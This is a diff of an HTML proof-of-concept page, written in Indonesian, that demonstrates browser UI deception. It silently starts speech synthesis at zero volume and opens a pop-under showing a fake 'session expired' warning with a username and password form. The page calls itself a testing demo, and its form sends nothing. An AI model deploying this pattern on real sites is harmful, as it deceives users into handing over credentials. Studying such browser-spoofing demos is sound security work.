@@ -1,21 +1,51 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Audibility Spoofing Test</title>
+    <title>UI Deception via Silent Speech Demo</title>
 </head>
 <body>
-    <h3>Test: Silent Speech Synthesis</h3>
-    <p>Click the button below and observe the speaker icon on your browser tab.</p>
-    
-    <button onclick="silentSpoof()">Start Silent Spoofing</button>
+    <h3>UI Deception via Silent Speech Synthesis</h3>
+    <p>Klik tombol di bawah. Halaman ini akan mencoba memicu speech synthesis dan membuka halaman lain di latar belakang.</p>
+    <p>Ini hanya demonstrasi konsep untuk tujuan pengujian.</p>
+
+    <button onclick="startDeception()">▶ Mulai Demo</button>
 
     <script>
-        function silentSpoof() {
-            const utter = new SpeechSynthesisUtterance('This is a secret inaudible message.');
-            utter.volume = 0.0; // Kunci dari kerentanan
+        function startDeception() {
+            // 1. Memicu speech synthesis senyap
+            // Di browser versi terbaru, ini mungkin tidak menampilkan ikon speaker,
+            // tetapi menunjukkan bagaimana API dapat digunakan tanpa sepengetahuan pengguna.
+            const utter = new SpeechSynthesisUtterance('Ini adalah pesan rahasia.');
+            utter.volume = 0.0; // Senyap
             speechSynthesis.speak(utter);
-            console.log('Speech synthesis with volume 0.0 has started.');
-            alert('Check your browser tab! It should show a speaker icon, even though no sound is playing.');
+            console.log('Speech synthesis senyap telah dimulai.');
+
+            // 2. Membuka pop-under (halaman lain di tab baru)
+            // Membuka halaman tentang:blank sebagai contoh. Dalam skenario nyata,
+            // ini bisa berupa halaman login palsu atau peringatan sistem.
+            const newWindow = window.open('about:blank', '_blank');
+            if (newWindow) {
+                // Menulis konten palsu ke halaman baru
+                newWindow.document.write(`
+                    <html>
+                    <head><title>⚠️ Peringatan Keamanan</title></head>
+                    <body style="font-family: sans-serif; text-align: center; padding: 50px;">
+                        <h1 style="color: red;">⚠️ Sesi Anda Telah Kadaluwarsa</h1>
+                        <p>Silakan masukkan kredensial Anda untuk masuk kembali.</p>
+                        <form>
+                            <input type="text" placeholder="Username" style="padding: 10px; margin: 10px;"><br>
+                            <input type="password" placeholder="Password" style="padding: 10px; margin: 10px;"><br>
+                            <button type="submit" style="padding: 10px 20px;">Masuk</button>
+                        </form>
+                        <p style="font-size: 12px; color: gray;">Ini adalah halaman palsu untuk demonstrasi.</p>
+                    </body>
+                    </html>
+                `);
+                newWindow.document.close(); // Selesai menulis
+                alert('Demo selesai. Periksa tab browser Anda untuk melihat pop-under yang terbuka.');
+            } else {
+                alert('Gagal membuka pop-under. Mungkin diblokir oleh browser Anda.');
+            }
         }
     </script>
 </body>
